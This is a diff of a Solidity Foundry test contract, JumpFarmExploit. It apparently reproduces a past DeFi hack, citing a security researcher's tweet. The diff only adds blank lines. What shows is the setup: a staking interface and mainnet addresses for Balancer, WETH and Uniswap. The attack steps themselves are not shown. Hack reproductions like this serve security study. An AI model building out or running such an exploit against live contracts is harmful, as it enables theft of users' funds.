@@ -13,11 +13,14 @@ import "./../interface.sol";
 // https://twitter.com/DecurityHQ/status/1699384904218202618
 
 interface IStaking {
+
     function unstake(address _to, uint256 _amount, bool _rebase) external;
     function stake(address _to, uint256 _amount) external;
+
 }
 
 contract JumpFarmExploit is Test {
+
     IBalancerVault balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
     IERC20 weth = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
     IUniswapV2Router router = IUniswapV2Router(payable(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D));
@@ -79,4 +82,5 @@ contract JumpFarmExploit is Test {
     }
 
     receive() external payable {}
+
 }
